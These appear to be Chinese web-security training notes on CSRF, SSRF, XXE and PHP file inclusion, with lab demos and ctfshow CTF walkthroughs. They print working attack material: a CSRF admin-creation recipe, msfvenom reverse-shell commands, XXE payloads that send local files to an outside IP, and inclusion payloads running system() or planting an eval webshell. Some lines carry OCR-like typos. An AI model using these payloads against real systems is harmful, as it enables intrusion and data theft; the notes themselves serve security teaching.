<h4 id="系列内容点："><a href="#系列内容点：" class="headerlink" title="#系列内容点："></a>#系列内容点：</h4><p>1、CSRF&amp;SSRF&amp;原理&amp;利用&amp;协议等<br>2、CSRF&amp;SSRF&amp;黑盒&amp;审计&amp;修复等</p>
<p>演示案例：<br>CSRF-原理&amp;后台自动添加管理员<br>SSRF-原理&amp;服务&amp;协议&amp;内网&amp;漏洞<br>SSRF-某实际案例测试演示（功能点）</p>
<h4 id="CSRF-原理-后台自动添加管理员"><a href="#CSRF-原理-后台自动添加管理员" class="headerlink" title="#CSRF-原理&amp;后台自动添加管理员"></a>#CSRF-原理&amp;后台自动添加管理员</h4><p>案例说明：小迪在登录后台管理自己网站的时候，突然群里给小迪说阿祖又说爱上别人了，随后给我发了个URL链接，小迪直接点了进去，GG!<br>小迪的网站：htp:&#x2F;test.xiaodi8.com&#x2F;<br>发送的URL:htp:∥47.94.236.117&#x2F;add.html<br>利用流程：<br>1、获取目标的触发数据包<br>2、利用CSRFTestert构造导出<br>3、诱使受害者访问特定地址触发<br>上面的那个add.html就是增加管理员命令的那个数据包，至于这个URL的构造我们可以利用CSRFTester这个工具来构造，具体的流程就是首先通过前期的信息收集得知这个网站是由什么系统搭建的，那么我们就可以在本地搭建个一样的，然后打开这个工具，首先点击start，并且浏览器也要设置代理为本地的8008端口，然后在浏览器执行添加管理员的操作，抓到包之后就用from形式，然后点击右下角保存就是我们需要的地址，然后还要对这个数据包进行修改，只保留那个request2的，其他的全部删掉。<br>CSRF攻击需要满足三个条件：网站在管理员登录状态(或则不是网站的话其他的也得是登陆状态)，然后能构造数据包，并且构造的地址对方会点击。三个条件缺一不可。<br>通俗的解释CSRF:</p>
<p>“攻击者盗用了你的身份，以你的名义发送恶意请求”，CSRF是一种依赖web浏览器的、被混淆过的代理人攻击，往往涉及到个人隐私泄露以及财产安全。</p>
<p>csrf黑盒首先看有无token，第二点看能够触发的数据包的地址是不是管理员直接访问就可以直接触发成功，有没有验证过程，有的话能不能绕过，不能绕过就gg，第三个看同源策略，这个可以通过抓包去修改refer的值.</p>
<h4 id="SSRF-原理-服务-协议-内网-漏洞"><a href="#SSRF-原理-服务-协议-内网-漏洞" class="headerlink" title="#SSRF-原理&amp;服务&amp;协议&amp;内网&amp;漏洞"></a>#SSRF-原理&amp;服务&amp;协议&amp;内网&amp;漏洞</h4><p>-参考文章：https:w.t00ls.cc&#x2F;articles-41070.html<br>案例说明：小迪在本地创建了远程图片文件加载应用，直接被攻击者利用SSF探针本地<br>及内网服务，并利用某漏洞直接获取到内网某主机的权限！<br>1、服务探针：<br><a href="http://127.0.0.1:8081/">http://127.0.0.1:8081/</a><br>htp:&#x2F;&#x2F;127.0.0.1:3306&#x2F;<br>2、协议玩法：（更多玩法见上图）<br>file:&#x2F;&#x2F;&#x2F;D:&#x2F;<a href="http://www.txt/">www.txt</a><br>dict:&#x2F;&#x2F;127.0.0.1:3306&#x2F;info<br><a href="ftp://192.168.46.148/">ftp://192.168.46.148:21</a><br>3、内风扫描：<br><a href="http://192.168.46.148:8080/">http://192.168.46.148:8080</a><br>4、漏洞利用：<br>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_http LHOST&#x3D;47.94.236.117<br>LPORT&#x3D;6688-f exe-o xx.exe<br>-监听：<br>use exploit&#x2F;multi&#x2F;handler<br>set payload windows&#x2F;meterpreter&#x2F;reverse_http<br>set Ihost 0.0.0.0<br>set Iport 6688<br>run<br>-下载：<a href="http://192.168.46.148:8080/?search==%00">http://192.168.46.148:8080/?search==%00</a>(.execlcmd.exe%20&#x2F;c%20certutil%20-</p>
<h1 id="第40天-WEB攻防-通用漏洞-CSRF-SSRF-代码审计-同源策略-加载函数"><a href="#第40天-WEB攻防-通用漏洞-CSRF-SSRF-代码审计-同源策略-加载函数" class="headerlink" title="第40天 WEB攻防-通用漏洞&amp;CSRF&amp;SSRF&amp;代码审计&amp;同源策略&amp;加载函数"></a>第40天 WEB攻防-通用漏洞&amp;CSRF&amp;SSRF&amp;代码审计&amp;同源策略&amp;加载函数</h1><h4 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h4><p>同上节</p>
<h4 id="演示案例：-17"><a href="#演示案例：-17" class="headerlink" title="演示案例："></a>演示案例：</h4><p>代码审计-CSRF.SCMSFH无验证</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">思路：添加用户出抓包–使用CSRF抓包工具构造添加指定管理员账户的html文件并将文件上传到vps–受害者在网站保持登录状态下访问构造好的vps文件链接–触发csrf语句添加指定管理员账户</span><br><span class="line">代码审计：找到添加管理员add处代码–发现除了添加账户名的规则外无其他过滤–存在csrf漏洞</span><br></pre></td></tr></table></figure>
</blockquote>
<p><strong>代码审计-CSRF-ZBLOG同源策略</strong></p>
<blockquote>
<p>思路：同上不走测试csrf漏洞，发现语句执行返回错误，代理审计发现添加管理员出含有referer监测–<br>两种绕过思路<br>1、伪造-需要在代码数据包文件固定来源 2、尝试在网站寻找可上传地方，上传数据包文件，取得当前同域名访问地址</p>
</blockquote>
<p><strong>代码审计-SSRF.Yzmcms功能&amp;函数</strong></p>
<blockquote>
<p>思路：采集功能处写入文件读取代码–读取到服务器下文件</p>
</blockquote>
<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF:"></a>SSRF:</h4><p>1、特定漏洞功能-&gt;代码段分析审计<br>2、特定漏洞函数-&gt;测试对应功能判断<br>功能点-采集审计<br>采集添加-测试-抓包-代码-远程请求资源操作（函数）<br>函数-功能审计<br>file_get_contents</p>
<h4 id="特性挖掘审计"><a href="#特性挖掘审计" class="headerlink" title="特性挖掘审计"></a>特性挖掘审计</h4><p>1.直接复现有没有<br>成功-&gt;有漏洞<br>失败-&gt;代码-&gt;缺陷过滤（绕过）-&gt;有漏洞<br>失败-&gt;代码-&gt;完整过滤-&gt;没有漏洞<br>来源检测：<br>1、伪造-需要在代码数据包文件固定来源<br>2、尝试在网站寻找可上传地方，上传数据包文件，取得当前同域名访问地址</p>
<h4 id="其他漏洞："><a href="#其他漏洞：" class="headerlink" title="其他漏洞："></a>其他漏洞：</h4><p>关键函数和应用功能</p>
<h1 id="第41天-WEB攻防-通用漏洞-XML-XXE-无回显-DTD实体-伪协议-代码审计"><a href="#第41天-WEB攻防-通用漏洞-XML-XXE-无回显-DTD实体-伪协议-代码审计" class="headerlink" title="第41天 WEB攻防-通用漏洞&amp;XML&amp;XXE&amp;无回显&amp;DTD实体&amp;伪协议&amp;代码审计"></a>第41天 WEB攻防-通用漏洞&amp;XML&amp;XXE&amp;无回显&amp;DTD实体&amp;伪协议&amp;代码审计</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">说明：xxe这个知识点也是CTF赛题中的热门考点之一，是OWASP中的一部分，面试知识点什么的很容易问到的。</span><br></pre></td></tr></table></figure>

<h4 id="知识点：-21"><a href="#知识点：-21" class="headerlink" title="知识点："></a>知识点：</h4><p>1、XML&amp;XXE-原理&amp;发现&amp;利用&amp;修复等<br>2、ML&amp;XXE黑盒模式下的发现与利用<br>3、XML&amp;XXE-白盒模式下的审计与利用<br>4、XML&amp;XXE-无回显&amp;伪协议&amp;产生层面</p>
<h4 id="思路点："><a href="#思路点：" class="headerlink" title="#思路点："></a>#思路点：</h4><p>参考：<a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a></p>
<p>-XXE黑盒发现：</p>
<blockquote>
<p>1、获取得到Content-Type或数据类型为xml时，尝试进行xml语言payload进行测试<br>2、不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试XXE<br>3、XXE不仅在数据传输上可能存在漏洞，同样在文件上传引用插件解析或预览也会造成文件中的XXE Payload被执行</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注：一般在CTF题目中都会比较刻意，就能够去直接发现找到xml的格式，甚至有些题还会直接给出xml文件。</span><br></pre></td></tr></table></figure>

<p><strong>-XXE白盒发现：</strong></p>
<blockquote>
<p>1、可通过应用功能追踪代码定位审计<br>2、可通过脚本特定函数搜索定位审计<br>3、可通过伪协议玩法绕过相关修复等</p>
</blockquote>
<p>详细点：</p>
<blockquote>
<p>XML被设计为传输和存储数据，ML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。XXE漏洞全称KML External Entity Injection,即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p>
</blockquote>
<p><strong>XML与HTML的主要差异：</strong></p>
<blockquote>
<p>XML被设计为传输和存储数据，其焦点是数据的内容。<br>HTML被设计用来显示数据，其焦点是数据的外观。<br>HTML旨在显示信息，而XML旨在传输信息。</p>
</blockquote>
<h4 id="XXE修复防卸方案："><a href="#XXE修复防卸方案：" class="headerlink" title="XXE修复防卸方案："></a>XXE修复防卸方案：</h4><p>-方案1-禁用外部实体</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line">libxml disable_entity_loader(true);</span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf</span><br><span class="line">=DocumentBuilderFactory.newlnstance（）:dbf.setExpandEntityReferences(false).</span><br><span class="line">Python:</span><br><span class="line"><span class="keyword">from</span> Ixml <span class="keyword">import</span> etreexmlData</span><br><span class="line">etree.parse(xmiSource,etree.XMLParser(resolve entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure>

<p>-方案2-过滤用户提交的XML数据</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">过滤关键词：&lt;IDOCTYPE和&lt;IENTITY,或者SYSTEM和PUBLIC</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/img_convert/5782d6c9d75646441930bebec4b15949.png" alt="img"></p>
<h4 id="演示案例：-18"><a href="#演示案例：-18" class="headerlink" title="演示案例："></a>演示案例：</h4><p>XML&amp;XXE-黑盒-原理&amp;探针&amp;利用&amp;玩法等<br>XML&amp;XXE-前端-CTF&amp;Jarvisoj&amp;探针&amp;利用<br>XML&amp;XXE-白盒-CMS&amp;PHPSHE&amp;无回显审计</p>
<h4 id="XML-XXE黑盒-原理-探针-利用-玩法等"><a href="#XML-XXE黑盒-原理-探针-利用-玩法等" class="headerlink" title="#XML&amp;XXE黑盒-原理&amp;探针&amp;利用&amp;玩法等"></a>#XML&amp;XXE黑盒-原理&amp;探针&amp;利用&amp;玩法等</h4><blockquote>
<p>思路：本地靶场抓包发现post提交的参数中格式为xml格式且content-type为application&#x2F;xml判定为xml–修改数据包尝试读取文件内容–此时若无回显尝试进行数据外带发现能够实现–引用外部实体evil2.dtd文件进行读取（此时若无回显也无法实现）–最后利用外带和引用外部实体先读取这个e.txt，读取到的信息复制给变量file。然后引用外部实体test.dtd，然后外部实体里面写上用get.php这个文件的file参数去接收上面的变量file的内容。那么最后我们读取到的内容就会在file.txt这个文本文档中显示</p>
</blockquote>
<p>参考：<a href="https://www.cnblogs.com/20175211lyzp/11413335.html">https://www.cnblogs.com/20175211lyzp/11413335.html</a></p>
<p>1、读取文件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IDOCTYPE</span> <span class="attr">Mikasa</span>[</span></span><br><span class="line"><span class="tag">&lt;<span class="attr">IENTITY</span> <span class="attr">test</span> <span class="attr">SYSTEM</span> &quot;<span class="attr">file:</span>///<span class="attr">d</span>/<span class="attr">e.txt</span>&quot;&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">usemname</span>&gt;</span>&amp;test<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>Mikasa<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.1带外测试：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IDOCTYPE</span> <span class="attr">test</span>[</span></span><br><span class="line"><span class="tag">&lt;<span class="attr">IENTITY</span> <span class="attr">file</span> <span class="attr">SYSTEM</span> &quot;<span class="attr">http:</span>//<span class="attr">9v57ll.dnslog.cn</span>&quot;&gt;</span></span><br><span class="line">%file;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">usemame</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>Mikasa<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2、外部引用实体dtd:<br>实体引用：引用远程的evil2.dtd文件<br>1、解决拦截防护绕过问题<br>2、解决数据不回显问题</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IDOCTYPE</span> <span class="attr">test</span>[</span></span><br><span class="line"><span class="tag">&lt;<span class="attr">IENTITY</span> <span class="attr">file</span> <span class="attr">SYSTEM</span> &quot;<span class="attr">http:</span>//<span class="attr">127.0.0.1:8081</span>/<span class="attr">evil2.dtd</span>&quot;&gt;</span></span><br><span class="line">%file,</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">usemame</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>Mikasa<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">evil2.dtd   读取e.txt文件</span><br><span class="line"><span class="tag">&lt;<span class="name">IENTITY</span> <span class="attr">send</span> <span class="attr">SYSTEM</span> &quot;<span class="attr">file:</span>///<span class="attr">d:</span>/<span class="attr">e.txt</span>&quot;&gt;</span></span><br></pre></td></tr></table></figure>

<p>3、无回显读文件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IDOCTYPE</span> <span class="attr">ANY</span>[</span></span><br><span class="line"><span class="tag">&lt;<span class="attr">IENTITY</span> <span class="attr">file</span> <span class="attr">SYSTEM</span> &quot;<span class="attr">file:</span>///<span class="attr">d:</span>/<span class="attr">e.tct</span></span></span><br><span class="line"><span class="tag">&lt;<span class="attr">IENTITY</span> <span class="attr">remote</span> <span class="attr">SYSTEM</span> &quot;<span class="attr">http:</span>//<span class="attr">47.94.236.117</span>/<span class="attr">testdtd</span>&quot;&gt;</span></span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">test.dtd</span><br><span class="line"><span class="tag">&lt;<span class="name">IENTITY</span> % <span class="attr">all</span> &quot;&lt;<span class="attr">IENTITY</span> <span class="attr">send</span> <span class="attr">SYSTEM</span> &#x27;<span class="attr">http:</span>//<span class="attr">47.94.236.117</span>/<span class="attr">get.php</span>?<span class="attr">file</span>=<span class="string">%file;</span>&#x27;&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="XML-XXE-前端-CTF-Jarvisoj-探针-利用"><a href="#XML-XXE-前端-CTF-Jarvisoj-探针-利用" class="headerlink" title="#XML&amp;XXE-前端-CTF&amp;Jarvisoj&amp;探针&amp;利用"></a>#XML&amp;XXE-前端-CTF&amp;Jarvisoj&amp;探针&amp;利用</h4><p>思路：通过前端代码发现参数的传递是通过xml实现的，此时抓包构造数据包尝试进行文件读取报错是因为文件类型为json修改为xml后返回正确<br><a href="http://web.jarvisoj.com:9882/">http://web.jarvisoj.com:9882/</a><br>XXE黑盒发现：<br>1、获取得到Content-Type或数据类型为Xml时，尝试进行xml语言payload进行测试<br>2、不管获取的Content-Type类型或数据传输类型，均可尝试修改后提文测试xxe<br>流程：功能分析-前端提文-源码&amp;抓包构造Paylod测试<br>更改清求据格式：Content-Type</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0?&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">&lt;!DOCTYPE ANY I</span></span></span><br><span class="line"><span class="string"><span class="meta">&lt;!ENTITY f SYSTEM&quot;</span> file:///home/ctf/fiao.txt&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="meta">&lt;x&gt;&amp;&lt;/x&gt;</span></span><br></pre></td></tr></table></figure>

<p>#XML&amp;XOXE-白盒-CMS&amp;PHPSHE&amp;无回显审计<br>思路：通过全局搜索xml解析函数逐步找到存在漏洞的函数和文件–抓包改包测试若外带出数据则证明漏洞存在<br>审计流程：<br>1、漏洞函数simplexml_load_string<br>2、pe_getxml函数调用了漏洞函数<br>3、wechat_getxmli谓用了pe_getxml<br>4、notify_urtg用了wechat_getxml<br>漏洞函数在自定义函数be getxmlg里面-&gt;谁调用了pe_getxml–&gt;wechat_getxml–找到并访问存在漏洞的文件<br>访问notify_url文件触发wechat_getxmlE函数，构造Paylod测试<br>先尝试读取文件，无回显后带外测试：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IDOCTYPE</span> <span class="attr">test</span>[</span></span><br><span class="line"><span class="tag">&lt;<span class="attr">IENTITY</span> <span class="attr">file</span> <span class="attr">SYSTEM</span> &quot;<span class="attr">http:</span>//<span class="attr">1uwlwv.dnslog.cn</span>&quot;&gt;</span></span><br><span class="line">%file.</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">usemame</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>Mikasa<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后带外传递数据解决无回显：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IDOCTYPE</span> <span class="attr">ANY</span>[</span></span><br><span class="line"><span class="tag">&lt;<span class="attr">IENTITY</span> <span class="attr">file</span> <span class="attr">SYSTEM</span> &quot;<span class="attr">file:</span>///<span class="attr">d:</span>/<span class="attr">e.txt</span>&quot;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IENTITY</span> <span class="attr">remote</span> <span class="attr">SYSTEM</span> &quot;<span class="attr">http:</span>//<span class="attr">47.94.236.117</span>/<span class="attr">testdtd</span>&quot;&gt;</span></span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;send:<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">testdtd:</span><br><span class="line"><span class="tag">&lt;<span class="name">IENTITY</span> <span class="attr">all</span> &quot;&lt;<span class="attr">IENTITY</span> <span class="attr">send</span> <span class="attr">SYSTEM</span> &#x27;<span class="attr">http:</span>//<span class="attr">47.94.236.117</span>/<span class="attr">get.php</span>?<span class="attr">file</span>=<span class="string">%file;</span>&#x27;&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure>

<h1 id="第42天：WEB攻防-通用漏洞-文件包含-LFI-RFI-伪协议编码算法-代码审计"><a href="#第42天：WEB攻防-通用漏洞-文件包含-LFI-RFI-伪协议编码算法-代码审计" class="headerlink" title="第42天：WEB攻防-通用漏洞&amp;文件包含&amp;LFI&amp;RFI&amp;伪协议编码算法&amp;代码审计"></a>第42天：WEB攻防-通用漏洞&amp;文件包含&amp;LFI&amp;RFI&amp;伪协议编码算法&amp;代码审计</h1><h4 id="知识点：-22"><a href="#知识点：-22" class="headerlink" title="知识点："></a>知识点：</h4><p>1、解释什么是文件包含<br>2、分类-本地LF月&amp;远程RFI<br>3、利用-配合上传&amp;日志&amp;会话<br>4、利用-伪协议&amp;编码&amp;算法等</p>
<h4 id="核心知识："><a href="#核心知识：" class="headerlink" title="#核心知识："></a>#核心知识：</h4><p>1、本地包含LF1&amp;远程包含RF1-区别<br>一个只能包含本地，一个可以远程加载<br>具体形成原因由代码和环境<a href="https://so.csdn.net/so/search?q=%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6&spm=1001.2101.3001.7020">配置文件</a>决定<br>2、各类<a href="https://so.csdn.net/so/search?q=%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80&spm=1001.2101.3001.7020">脚本语言</a>包含代码写法-见下文</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;!--#include file=<span class="string">&quot;1.asp&quot;</span>--&gt;</span><br><span class="line">&lt;!--#include file=<span class="string">&quot;top.aspx&quot;</span>-&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">c:import</span> <span class="attr">url</span>=<span class="string">&quot;http://thief.one/1.jsp&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">jsp:include</span> <span class="attr">page</span>=<span class="string">&quot;head.jsp&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">&lt;%@include file=&quot;head.jsp&quot;%&gt;</span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?php include(test.php&#x27;)?</span></span></span><br></pre></td></tr></table></figure>

<p>3、PHP文件包含伪协议玩法</p>
<p><a href="https://www.cnblogs.com/endust/p/11804767.html">https://www.cnblogs.com/endust/p/11804767.html</a></p>
<h4 id="思路要点："><a href="#思路要点：" class="headerlink" title="#思路要点："></a>#思路要点：</h4><blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑盒发现：主要观察参数传递的数据和文件名是否对应</span><br><span class="line">-白盒发现： 1、可通过应用功能追踪代码定位审计</span><br><span class="line">2、可通过却本特定函数搜索定位审计</span><br><span class="line">3、可通过伪协议玩法绕过相关修复等</span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="本课总结："><a href="#本课总结：" class="headerlink" title="#本课总结："></a>#本课总结：</h4><p>1、有可控文件如能上传文件，配合上传后包含<br>2、无可控文件可以利用日志或Session&amp;伪协议<br>3、代码国定目录及文件后缀时需考虑版本绕过<br>4、伪协议玩法是建立在代码中只有变量存在时</p>
<h4 id="演示案例：-19"><a href="#演示案例：-19" class="headerlink" title="演示案例："></a>演示案例：</h4><p>前置知识-原理&amp;分类&amp;探针&amp;利用&amp;修复<br>CTF应用-CTFSHOW-78关卡到117关卡<br>CMS源码-XHCMS-代码审计&amp;日志&amp;绕过</p>
<h4 id="前置知识-原理-分类-探针-利用-修复"><a href="#前置知识-原理-分类-探针-利用-修复" class="headerlink" title="#前置知识-原理&amp;分类&amp;探针&amp;利用&amp;修复"></a>#前置知识-原理&amp;分类&amp;探针&amp;利用&amp;修复</h4><p>比如说1.php写入phpinfo(); 然后2.txt写入 include(‘1.txt’);那么在访问2.php时就会返回1.php中的内容，同样过滤也是，只需要先将过滤的函数定义好，然后在需要过滤的地方直接include，相当于引用。包含即执行，php文件中包含txt文件，也会以php执行。</p>
<blockquote>
<p>接下来就是一些ctfshow的刷题记录，ctfshow上的文件包含还是讲的很详细的，这里就不过多介绍了。</p>
</blockquote>
<h4 id="CTF应用-CTFSHOW-78关卡到117关卡"><a href="#CTF应用-CTFSHOW-78关卡到117关卡" class="headerlink" title="#CTF应用-CTFSHOW-78关卡到117关卡"></a>#CTF应用-CTFSHOW-78关卡到117关卡</h4><p>PHP伪协议参考链接：<a href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a></p>
<h6 id="78-php-http协议"><a href="#78-php-http协议" class="headerlink" title="78-php&amp;http协议"></a>78-php&amp;http协议</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">payload:?file=php://input post:&lt;?php system(&#x27;tac flag.php&#x27;);? payload:?file=http://www.xiaodi8.com/1.txt 1.txt:&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br><span class="line">思路：观察网站并不存在上传点，只有传参处–尝试直接读取flag.php(?file=flag.php)并无返回结果，然后尝试使用伪协议 (php://input 使用post提交数据)–再使用php system执行读取当前路径文件ls–读取文件内容tac</span><br></pre></td></tr></table></figure>

<h6 id="79-data-http协议"><a href="#79-data-http协议" class="headerlink" title="79-data&amp;http协议"></a>79-data&amp;http协议</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:?file=data://text/plain.&lt;?=system(tac flag.&quot;)?&gt;I</span><br><span class="line">payload</span><br><span class="line">?file=data://text/plain:base64.PD9waHAgc3lzdGVtKCdoYWMgZmxhZy5waHAnKTs/Pg==</span><br><span class="line">payload:?file=http://www.xiaodi8.com/1.txt 1.txt:&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br><span class="line">思路：有前端JS可知此处过滤了php字符，所以可以使用data、http远程包含绕过</span><br></pre></td></tr></table></figure>

<h6 id="80-81-日志包含"><a href="#80-81-日志包含" class="headerlink" title="80 81-日志包含"></a>80 81-日志包含</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、利用其他协议如fle,zib等</span><br><span class="line">2、利用日志记录UA特性包含执行</span><br><span class="line">分忻需文件名及带有php关键字放弃</span><br><span class="line">故利用日志记录UA信息，UA带入代码</span><br><span class="line">包含：var/log/nginx/access.log</span><br><span class="line">思路：有JS代码可以此处过滤了PHP和DATA协议，尝试使用http远程包含也没有返回结果说明网站关闭了远程文件包含</span><br><span class="line"></span><br><span class="line">后续只能使用zip和 file协议 但是两者都需要知道文件的绝对路径，通过信息收集知道中间件为nginx，尝试读取日志文件，/var/log/nginx/acess.log,读取成功尝试通过修改UA信息写入读取当前路径文件(&lt;?php system(&#x27;ls&#x27;);?&gt;)–读取flag(&lt;?php system(&#x27;cat fl0g.php&#x27;); ?&gt;)</span><br></pre></td></tr></table></figure>

<h6 id="81关-增加过滤了-仍可以使用日志文件绕过"><a href="#81关-增加过滤了-仍可以使用日志文件绕过" class="headerlink" title="81关 增加过滤了 : 仍可以使用日志文件绕过"></a>81关 增加过滤了 : 仍可以使用日志文件绕过</h6><h6 id="82-86-SESSION包含"><a href="#82-86-SESSION包含" class="headerlink" title="82-86-SESSION包含"></a>82-86-SESSION包含</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.cnblogs.com/Interpreter/p/14086164.html</span><br><span class="line">https://www.cnblogs.com/echoDetected/p/13976405.html</span><br></pre></td></tr></table></figure>

<h6 id="87-php-filter-write-加密编码"><a href="#87-php-filter-write-加密编码" class="headerlink" title="87-php:&#x2F;filter&#x2F;write&amp;加密编码"></a>87-php:&#x2F;filter&#x2F;write&amp;加密编码</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、利用base64</span><br><span class="line">ur编a码2次：php/filter/write=convert.base64-decode/resource=123.php</span><br><span class="line">content=aaPD9waHAgQGV2YWwOJF9QT1NUW2FdKTs/Pg==</span><br><span class="line">2、利用凯撒13:</span><br><span class="line">ur编码2次：php:/filter/write=string.rot13/resource=2.php</span><br><span class="line">content=&lt;?cuc flfgrz(&#x27;gnp s*.cuc&#x27;):?&gt;  </span><br></pre></td></tr></table></figure>

<p>思路：增加了 “.” 过滤，致使不能直接使用日志,所以使用编码绕过，这里使用php写入参数，然后传参出写入后门代码读取</p>
<h6 id="88-data-base64协议"><a href="#88-data-base64协议" class="headerlink" title="88-data&amp;base64协议"></a>88-data&amp;base64协议</h6><p>过滤PHP,各种符号，php代码编码写出无符号base64值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Payload:</span><br><span class="line">file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdoYWMgKi5waHAnKTtlY2hvIDEyMz</span><br><span class="line">s/PmFK</span><br></pre></td></tr></table></figure>

<p>思路：此处过滤如下图，没有过滤data，尝试将data后数据进行base64编码绕过。</p>
